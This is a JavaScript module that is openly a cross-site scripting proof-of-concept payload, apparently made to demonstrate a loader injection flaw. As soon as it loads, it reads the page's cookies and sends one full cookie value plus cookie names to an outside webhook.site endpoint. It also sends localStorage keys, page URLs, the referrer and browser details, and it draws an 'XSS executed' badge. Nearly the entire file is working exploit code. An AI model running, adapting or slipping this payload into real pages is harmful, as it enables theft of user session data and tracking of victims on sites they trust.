define([], function () {
  var WEBHOOK_URL = "https://webhook.site/ee5f90c0-44fd-49a8-9d57-4ebda535476a";
  var COOKIE_ALLOWLIST = [
    "_ga",
    "_gid",
    "_gat",
    "OptanonConsent",
    "OptanonAlertBoxClosed",
    "cookieconsent_status",
    "cookie_consent",
    "ak_bmsc",
    "bm_sv",
    "AMCV"
  ];

  function nowIso() {
    return new Date().toISOString();
  }

  function safeCall(fn, fallback) {
    try {
      return fn();
    } catch (e) {
      return fallback;
    }
  }

  function parseCookies() {
    var raw = safeCall(function () {
      return document.cookie || "";
    }, "");
    if (!raw) {
      return [];
    }
    return raw
      .split(";")
      .map(function (part) {
        var t = part.trim();
        var eq = t.indexOf("=");
        if (eq < 0) {
          return { name: t, value: "" };
        }
        return {
          name: t.slice(0, eq),
          value: t.slice(eq + 1)
        };
      })
      .filter(function (c) { return c.name; });
  }

  function pickLowRiskCookie(parsedCookies) {
    var i;
    for (i = 0; i < COOKIE_ALLOWLIST.length; i++) {
      var wanted = COOKIE_ALLOWLIST[i].toLowerCase();
      for (var j = 0; j < parsedCookies.length; j++) {
        if ((parsedCookies[j].name || "").toLowerCase().indexOf(wanted) !== -1) {
          return parsedCookies[j];
        }
      }
    }
    return parsedCookies.length ? parsedCookies[0] : null;
  }

  function collectNavigatorLite() {
    var n = window.navigator || {};
    return {
      userAgent: n.userAgent,
      language: n.language,
      languages: safeCall(function () { return (n.languages || []).slice(0, 5); }, []),
      platform: n.platform,
      cookieEnabled: n.cookieEnabled
    };
  }

  function sendPayload(payload) {
    var serialized = safeCall(function () { return JSON.stringify(payload); }, "{}");

    try {
      if (window.fetch) {
        fetch(WEBHOOK_URL, {
          method: "POST",
          mode: "no-cors",
          credentials: "omit",
          keepalive: true,
          headers: { "content-type": "application/json" },
          body: serialized
        });
        return;
      }
    } catch (e) {}

    try {
      if (navigator.sendBeacon) {
        navigator.sendBeacon(WEBHOOK_URL, serialized);
      }
    } catch (e) {}
  }

  function markVisualProof(ts) {
    var id = "cp-xss-proof-badge";
    if (document.getElementById(id)) {
      return;
    }
    var badge = document.createElement("div");
    badge.id = id;
    badge.textContent = "XSS executed at " + ts + " on " + window.location.origin;
    badge.style.position = "fixed";
    badge.style.right = "16px";
    badge.style.bottom = "16px";
    badge.style.padding = "10px 14px";
    badge.style.background = "#111";
    badge.style.color = "#00ff90";
    badge.style.font = "12px monospace";
    badge.style.zIndex = "2147483647";
    badge.style.border = "1px solid #00ff90";
    badge.style.borderRadius = "6px";
    document.documentElement.appendChild(badge);
  }

  function executePoC() {
    var ts = nowIso();
    var cookies = parseCookies();
    var chosen = pickLowRiskCookie(cookies);
    var localStorageKeys = safeCall(function () {
      var keys = [];
      for (var i = 0; i < localStorage.length && i < 30; i++) {
        keys.push(localStorage.key(i));
      }
      return keys;
    }, []);

    var marker = {
      executed: true,
      ts: ts,
      origin: window.location.origin,
      href: window.location.href
    };
    window.__CP_POC_MARKER__ = marker;
    safeCall(function () {
      localStorage.setItem("cp_poc_marker", JSON.stringify(marker));
    }, null);

    var payload = {
      event: "cp_hash_loader_xss_exec_proof",
      marker: {
        executed: true,
        ts: ts,
        victimOrigin: window.location.origin,
        victimHref: window.location.href,
        documentDomain: document.domain
      },
      selectedCookieProof: chosen,
      cookieNames: cookies.map(function (c) { return c.name; }).slice(0, 30),
      cookieCount: cookies.length,
      localStorageKeyCount: safeCall(function () { return localStorage.length; }, 0),
      localStorageKeys: localStorageKeys,
      navigator: collectNavigatorLite(),
      referrer: document.referrer || "",
      title: document.title || ""
    };

    markVisualProof(ts);
    sendPayload(payload);
    return marker;
  }

  executePoC();

  return {
    version: "101.0.0-exec-proof-single-post",
    render: function () {
      return executePoC();
    }
  };
});
